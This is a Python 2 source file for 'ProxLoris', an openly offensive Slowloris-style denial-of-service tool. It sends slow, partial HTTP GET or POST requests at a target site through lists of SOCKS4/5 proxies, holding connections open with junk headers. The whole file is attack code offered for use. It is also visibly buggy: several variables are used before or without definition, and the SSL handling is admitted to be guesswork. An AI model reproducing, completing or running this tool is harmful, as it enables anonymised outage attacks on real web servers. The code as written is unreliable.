#ProxLoris.py v2 - originally by rayZor_, project upgraded by infodox.
# Now using random user agents! More random junk data in GET requests!
# Code being cleaned!
import sys
import threading
import socket
import socks
import os
import time
import random
try:
    from ssl import wrap_socket # ninja SSL import bitches!
except:
    wrap_socket = socket.ssl


ualist = []

def load_useragents():
    if os.path.isfile('./ualist.txt'):
        for f in open('./ualist.txt', 'r'):
            ualist.append(f)

load_useragents()

#---------------------------------{ global }-------------------------------#
siteHost = ''
sitePort = 80
pInstance = 30 #use single proxy how many times?
userAgent = random.choice(ualist)
#--------------------------------------------------------------------------#

s5list = []
s4list = []

succeed = 0

def notice(msg):
    print '[+] ' + msg
    
def error(msg):
    print '[-] ' + msg
        
    

class Response(object):
    def __init__(self):
        self.chunks = []
    def callback(self, chunk):
        self.chunks.append(chunk)
    def content(self):
        return ''.join(self.chunks)

class http_drone:

    def __init__(self, paddress, ptype):
        self.paddress = paddress
        self.ptype = ptype
        self.sck = socket
        self.spawn_drone()

    def close(self):
        self.sckt.close()
    
    def conn(self):
        try:
            self.sckt.connect((siteHost, sitePort))
        except:
            return
        if attack == loris:
            req = 'GET /' + x + ' HTTP/1.1\r\n'
        elif attack == post:
            req = 'POST /' + page + param + x + ' HTTP/1.1\r\n'
        else:
            print("No Legit Attack Selected! Fuck off and try again!")
            sys.exit(1)    
        x = os.urandom(6000)    
        payload = req
        payload += 'Host: ' + target + '\r\n'
        payload += 'User-Agent: ' + userAgent + '\r\n'
        payload += 'Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
        payload += 'Accept-Language: en-us,en;q=0.5\r\n'
        payload += 'Accept-Encoding: gzip,deflate\r\n'
        payload += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
        payload += 'Keep-Alive: 900\r\n'
        payload += 'Connection: keep-alive\r\n'
        payload += 'Content-Type: application/x-www-form-urlencoded\r\n'
        payload += 'Content-length: 6000\r\n\r\n'

        while 1:
            time.sleep(2.7)

#            f = fs.readline()
#            f = f.strip()

            self.send('X-FuckOff: Connection Close\r\n')


    def send(self, msg):
        try:
            self.sckt.send(msg)
        except:
            return

    def spawn_drone(self):
        s = socks.socksocket()
        p = self.paddress.rsplit(':', 2)

        if len(p) != 2:
            error('Invalid proxy!')
            return

        if self.ptype == 's5':
            s.setproxy(socks.PROXY_TYPE_SOCKS5, p[0], int(p[1]))
        elif self.ptype == 's4':
            s.setproxy(socks.PROXY_TYPE_SOCKS4, p[0], int(p[1]))
        else:
            error('Invalid proxy!')
            return
        
        self.sckt = s

        if self.options['ssl'] ==  True: # THIS BIT HANDLES SSL
            wrap_socket(s)             # well, I hope it WILL...
        
        threading.Thread(target=self.conn, args=()).start()

def fork_drones():
    notice('Forking Socks5...')
   
    for i in range(0, len(s5list)):
        s5 = http_drone(s5list[i], 's5') 
        #threading.Thread(target=hit_site, args=(s5list[i], 's5')).start()
        time.sleep(0.05)
    
    notice('Forking Socks4...')
   
    for i in range(0, len(s4list)):
        s4 = http_drone(s4list[i], 's4')   
        #threading.Thread(target=hit_site, args=(s4list[i], 's4')).start()
        time.sleep(0.05)

def load_proxies():
    if os.path.isfile('./socks5.txt'):
        for f in open('./socks5.txt', 'r'):
            s5list.append(f)
        
    if os.path.isfile('./socks4.txt'):
        for f in open('./socks4.txt', 'r'):
             s4list.append(f)  
    
    num_proxies = (len(s4list) + len(s5list))
    notice('Loaded ' + str(num_proxies) + ' proxies.')

print "ProxLoris"

status = "blah"

def output_status(status):
    print(status)

gtg = 1

if(len(sys.argv) == 2):
    siteHost = sys.argv[1]
elif(len(sys.argv) == 3):
    siteHost = sys.argv[1]
    pInstance = int(sys.argv[2])
elif(len(sys.argv) == 4):
    siteHost = sys.argv[1]
    pInstance = int(sys.argv[2])
    sitePort = int(sys.argv[3])
elif(len(sys.argv) == 5):
    siteHost = sys.argv[1]
    pInstance = int(sys.argv[2])
    sitePort = int(sys.argv[3])
    attack = sys.argv[4]
else:
    error("Needs Arguements")
    print("Usage: <Target> <ProxyReuse> <port> ")
    print("Port defaults to 80")
    gtg = 0

if gtg > 0:
    load_proxies()

    for i in range(0, pInstance):
#		output_status(createstatus)
        fork_drones()
